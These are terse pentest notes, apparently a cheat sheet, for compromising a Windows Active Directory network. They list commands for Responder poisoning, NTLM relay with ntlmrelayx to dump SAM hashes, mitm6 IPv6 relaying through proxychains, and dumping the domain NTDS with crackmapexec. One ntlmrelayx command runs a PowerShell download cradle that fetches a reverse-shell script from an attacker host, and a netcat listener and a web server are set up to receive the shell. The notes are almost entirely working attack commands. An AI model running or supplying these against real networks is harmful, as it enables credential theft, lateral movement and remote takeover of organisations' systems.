responder.conf
```


❯ crackmapexec smb 192.168.0.0/24

❯ sudo Responder.py -I enp7s0 -dw --> get some hash

#dump SAM
❯ sudo Responder.py -I enp7s0 -dw --> get some hash (pash the hash)
❯ sudo ntlmrelayx.py -tf targets.txt -smb2support --> dump SAM(a lot of hashes) psexec.py

#gain access
❯ sudo Responder.py -I enp7s0 -dw 
❯ sudo ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.100/invoke-powershelltcp.ps1')"
#attacker
python -m http.server 80
rlwrap nc -nlvp 1234
```

ipv6

```
❯ sudo mitm6 -d kvzlx.local;
❯ sudo ntlmrelayx.py -6 -wh 192.168.0.100 -t smb://192.168.0.105 -socks -debug -smb2support
	socks
	
❯ proxychains(socks4) crackmapexec smb 192.168.0.105 -u 'user' -p 'any' -d 'kvzlx.local' --sam
```


## when get the domain admin dump the ntds (all hashes) pash the hash psexec.py
```
❯ crackmapexec smb 192.168.0.105 -u 'Administrator' -p 'passwd' --ntds vss
```